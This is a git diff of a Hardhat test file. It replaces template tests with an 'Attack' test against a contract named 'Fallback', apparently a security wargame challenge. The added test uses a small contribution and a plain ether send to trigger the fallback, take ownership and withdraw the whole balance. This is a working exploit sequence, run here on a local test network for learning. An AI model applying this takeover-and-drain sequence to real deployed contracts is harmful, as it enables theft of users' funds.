@@ -2,21 +2,27 @@ import { time, loadFixture } from "@nomicfoundation/hardhat-network-helpers";
 import { anyValue } from "@nomicfoundation/hardhat-chai-matchers/withArgs";
 import { expect } from "chai";
 import { ethers } from "hardhat";
+import { parseEther } from "ethers/lib/utils";
 
 const contractName = "Fallback";
 
+async function deployFixture() {
+  const [deployer, attacker] = await ethers.getSigners();
+  const { provider } = ethers;
+
+  await deployer.sendTransaction({
+    value: parseEther("10"),
+    to: attacker.address,
+  });
+
+  const Contract = await ethers.getContractFactory(contractName);
+  const contract = await Contract.deploy();
+
+  return { contract, deployer, attacker, provider };
+}
+
 describe(contractName, function () {
-  async function deployFixture() {
-    const [deployer, attacker] = await ethers.getSigners();
-    const { provider } = ethers;
-
-    const Contract = await ethers.getContractFactory(contractName);
-    const contract = await Contract.deploy();
-
-    return { contract, deployer, attacker, provider };
-  }
-
-  describe("Deployment", function () {
+  describe("Deploy", function () {
     it("contract owner should be deployer", async function () {
       const { contract, deployer } = await loadFixture(deployFixture);
       const owner = await contract.owner();
@@ -29,67 +35,39 @@ describe(contractName, function () {
     });
   });
 
-  // describe("Withdrawals", function () {
-  //   describe("Validations", function () {
-  //     it("Should revert with the right error if called too soon", async function () {
-  //       const { lock } = await loadFixture(deployFixture);
-
-  //       await expect(lock.withdraw()).to.be.revertedWith(
-  //         "You can't withdraw yet"
-  //       );
-  //     });
-
-  //     it("Should revert with the right error if called from another account", async function () {
-  //       const { lock, unlockTime, otherAccount } = await loadFixture(
-  //         deployFixture
-  //       );
-
-  //       // We can increase the time in Hardhat Network
-  //       await time.increaseTo(unlockTime);
-
-  //       // We use lock.connect() to send a transaction from another account
-  //       await expect(lock.connect(otherAccount).withdraw()).to.be.revertedWith(
-  //         "You aren't the owner"
-  //       );
-  //     });
-
-  //     it("Shouldn't fail if the unlockTime has arrived and the owner calls it", async function () {
-  //       const { lock, unlockTime } = await loadFixture(deployFixture);
-
-  //       // Transactions are sent using the first signer by default
-  //       await time.increaseTo(unlockTime);
-
-  //       await expect(lock.withdraw()).not.to.be.reverted;
-  //     });
-  //   });
-
-  //   describe("Events", function () {
-  //     it("Should emit an event on withdrawals", async function () {
-  //       const { lock, unlockTime, lockedAmount } = await loadFixture(
-  //         deployFixture
-  //       );
-
-  //       await time.increaseTo(unlockTime);
-
-  //       await expect(lock.withdraw())
-  //         .to.emit(lock, "Withdrawal")
-  //         .withArgs(lockedAmount, anyValue); // We accept any value as `when` arg
-  //     });
-  //   });
-
-  //   describe("Transfers", function () {
-  //     it("Should transfer the funds to the owner", async function () {
-  //       const { lock, unlockTime, lockedAmount, owner } = await loadFixture(
-  //         deployFixture
-  //       );
-
-  //       await time.increaseTo(unlockTime);
-
-  //       await expect(lock.withdraw()).to.changeEtherBalances(
-  //         [owner, lock],
-  //         [lockedAmount, -lockedAmount]
-  //       );
-  //     });
-  //   });
-  // });
+  describe("Attack", function () {
+    it("should claim ownership and reduce balance to 0", async function () {
+      const { contract, provider, attacker, deployer } = await loadFixture(
+        deployFixture
+      );
+      // contribute to Fallback by calling contribute
+      const attackerContribution = parseEther("0.0005");
+      const contributeData = await contract.populateTransaction.contribute();
+      await attacker.sendTransaction({
+        to: contract.address,
+        value: attackerContribution,
+        data: contributeData.data,
+      });
+      // trigger fallback
+      await attacker.sendTransaction({
+        to: contract.address,
+        value: attackerContribution,
+      });
+      // check contract balance
+      let contractBalance = await provider.getBalance(contract.address);
+      expect(contractBalance).to.be.eql(attackerContribution.mul(2));
+      // check attacker as owner
+      const owner = await contract.owner();
+      expect(owner).to.be.eql(attacker.address);
+      // withdraw balance
+      const withdrawData = await contract.populateTransaction.withdraw();
+      await attacker.sendTransaction({
+        to: contract.address,
+        data: withdrawData.data,
+      });
+      // check contract balance is 0
+      contractBalance = await provider.getBalance(contract.address);
+      expect(contractBalance.toString()).to.be.eql("0");
+    });
+  });
 });
